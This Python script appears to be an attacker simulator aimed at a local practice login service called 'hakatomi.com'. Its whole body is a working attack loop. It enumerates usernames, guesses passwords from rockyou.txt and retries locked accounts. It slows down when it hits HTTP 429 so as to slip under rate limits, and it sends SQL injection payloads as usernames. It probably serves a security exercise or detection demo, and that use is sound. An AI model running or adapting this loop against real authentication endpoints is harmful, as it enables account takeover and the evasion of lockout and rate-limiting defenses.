import os
import random
import sys
import time
from dataclasses import dataclass
from enum import Enum
from enum import auto
from typing import List
from typing import Optional

import os
import sys

os.environ["OPTERYX_DEBUG"] = "1"

sys.path.insert(1, os.path.join(sys.path[0], ".."))

import orjson
import requests
from api.drivers import read_random_lines
from api.drivers.creds import generate_usernames
from orso.tools import random_string

sys.path.insert(1, os.path.join(sys.path[0], "../hakatomi.com"))


class UserStatus(Enum):
    new = auto()
    active = auto()
    locked = auto()
    invalid = auto()
    unknown = auto()
    cracked = auto()


@dataclass
class User:
    username: str
    password: Optional[str] = None
    status: UserStatus = UserStatus.unknown

    def make_auth_payload(self):
        if self.password is None:
            password = "AAAA"
        else:
            password = self.password

        return orjson.dumps({"username": self.username, "password": password})




CODE = [("A", 4), ("B", 2), ("A", 3)]

HAKATOMI_URL: str = "http://localhost:8080/v1/authenticate"
DWELL: float = 0.2
INJECTION_PROBABILITY: float = 0.05
FIND_USER_PROBABILITY: float = 0.8

unlocked_users: int = 0
users = {}
sql_injections = []
potential_sql_injections = []

states = {
    "seen_429": False,  # been rate limited
    "seen_422": False,  # didn't pass validation
    "seen_accounts_without_locks": False
}

def format_code():
    return_code = []
    for i, v in enumerate(states.values()):
        if v:
            return_code.append(CODE[i][0] * CODE[i][1])
        else:
            return_code.append("?")
    return ":".join(return_code)

def randomly_select_user(statuses: List[UserStatus]) -> User:
    return random.choice([v for k, v in users.items() if v.status in statuses] + [None])

def user_stats() -> tuple:
    c = {}
    for s in [v.status for k, v in users.items()]:
        c[s.name] = sum(1 for k, v in users.items() if v.status == s)
    return list(c.items())

def choose_random_username() -> str:
    if not hasattr(choose_random_username, "cache") or not choose_random_username.cache:
        choose_random_username.cache = generate_usernames(10000)
    if random.random() < 0.1:
        return random_string(8)
    return choose_random_username.cache.pop()

def choose_random_password() -> str:
    if not hasattr(choose_random_password, "cache") or not choose_random_password.cache:
        choose_random_password.cache = read_random_lines("assets/rockyou.txt", 500)
    return choose_random_password.cache.pop()

def randomly_select_sql_injection() -> str:
    if potential_sql_injections:
        return potential_sql_injections.pop()

    INJECTION_PROBABILITY = 0.25
    return random.choice(sql_injections) + ";\n" + random.choice(secondary_sql_injections) + " --"


def issue_request(user: User):
    try:
        attempt = requests.post(url=HAKATOMI_URL, data=user.make_auth_payload(), headers={"user-agent": "Simon Gruber"})
    except:
        return 900, ""

    if attempt.status_code == 422:
        states["seen_422"] = True
    elif attempt.status_code == 429:
        states["seen_429"] = True
        # If we're rate limiting, we should slow down
        # work out a rate for us to sit to not trigger
        # the check - we have another process which slowly
        # reduces the dwell time, we're likely the saw-tooth
        # dwell times
        global DWELL
        DWELL = DWELL * 1.2
    elif attempt.text == '"user"':
        user.status = UserStatus.invalid
    elif attempt.text == '"locked"':
        user.status = UserStatus.locked
    elif attempt.text == '"password"':
        user.status = UserStatus.active
    elif attempt.text == '"okay"':
        user.status = UserStatus.cracked
    elif attempt.status_code == 500:
        pass

    return attempt.status_code, attempt.text


if __name__ == "__main__":

    # get the sql injections from the attack file
    potential_sql_injections = read_random_lines("assets/sql_injection.txt", 500)
    secondary_sql_injections = read_random_lines("assets/secondary_sql.txt", 500)

    loops = 0
    while True:
        loops += 1
        if loops % 10 == 0:
            print(user_stats(), loops)
        time.sleep(DWELL)
        DWELL = DWELL * 0.999 # slowly speed up
        if random.random() < 0.1:
            user = User(username=format_code())
            issue_request(user)
        if random.random() < FIND_USER_PROBABILITY:
            # guess a new username
            username = choose_random_username()
            cycles = 0
            while username in users:
                cycles += 1
                if cycles > 10:
                    print("I may have run out of usernames to guess")
                    # guess less often if we're running out
                    FIND_USER_PROBABILITY = FIND_USER_PROBABILITY * 0.90
                    username = None
                    break
                username = choose_random_username()
            if username:
                user = User(username=username)
                users[username] = user
                print(f"[{len(users)}] Trying {user.username}, not even sure they exist")
                issue_request(user)

        if random.random() < 0.25:
            # try a user we know exists
            user = randomly_select_user([UserStatus.unknown, UserStatus.active, UserStatus.new])
            if user:
                user.password = choose_random_password()
                if user:
                    print(
                        f"[{len(users)}] Trying {user.username}, who last time I checked was {user.status}."
                    )
                    code, text = issue_request(user)
                    if text != '"okay"':
                        user.password = None
                    users[user.username] = user

        if (unlocked_users < 3 and random.random() < 0.10) or (unlocked_users >= 3):
            # 10% of the time, attempt new password for a already locked account
            # unless we've detected that previously locked users are getting unlocked
            # then we increase the amount of attempts we do for these users
            user = randomly_select_user([UserStatus.locked])
            if user:
                print(
                    f"[{len(users)}] Trying {user.username}, who last time I checked was {user.status}."
                )
                status, message = issue_request(user)
                if message == "'locked'":
                    unlocked_users = 0
                else:
                    users[user.username] = user
                    print(f"{user.username} was unlocked")
                    unlocked_users += 1
                    if unlocked_users >= 3:
                        states["seen_accounts_without_locks"] = True

        if random.random() < INJECTION_PROBABILITY:
            # 2% of the time, attempt a SQL injection
            payload = randomly_select_sql_injection()
            if payload:
                print("Trying SQL injection - ", payload)
                user = User(username=payload)
                status, message = issue_request(user)
                if status != 500:
                    print("WORKED", status, message)
                    sql_injections.append(payload)
